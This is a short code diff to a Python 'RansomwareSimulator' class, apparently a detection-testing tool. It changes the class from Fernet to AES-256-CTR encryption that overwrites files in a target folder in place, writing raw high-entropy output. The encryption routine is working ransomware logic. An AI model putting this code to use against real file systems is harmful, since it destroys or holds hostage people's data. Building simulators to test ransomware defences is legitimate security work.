@@ -2,7 +2,8 @@ import os
 import json
 import base64
 from datetime import datetime
-from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -17,8 +18,8 @@ class RansomwareSimulator:
     def __init__(self, encryption_key=None):
         self.target_folder = DESTINATION_DIR
         self.key_path = os.path.join(TEMP_DIR, "decryption_key.json")
-        self.key = encryption_key or Fernet.generate_key()
-        self.cipher = Fernet(self.key)
+        # Generate 256-bit key (32 bytes) for AES-256
+        self.key = encryption_key or os.urandom(32)
         self.encrypted_files = []
 
     def scan_files(self):
@@ -44,10 +45,20 @@ class RansomwareSimulator:
             with open(file_path, "rb") as f:
                 original_data = f.read()
 
-            # Encrypt the data
-            encrypted_data = self.cipher.encrypt(original_data)
+            # Generate random IV (16 bytes for AES block size)
+            iv = os.urandom(16)
 
-            # Write encrypted data back
+            # Create AES-256-CTR cipher
+            cipher = Cipher(
+                algorithms.AES(self.key),
+                modes.CTR(iv),
+                backend=default_backend()
+            )
+            encryptor = cipher.encryptor()
+            ciphertext = encryptor.update(original_data) + encryptor.finalize()
+
+            # Write: IV (16 bytes) + ciphertext (raw binary for high entropy)
+            encrypted_data = iv + ciphertext
             with open(file_path, "wb") as f:
                 f.write(encrypted_data)
 
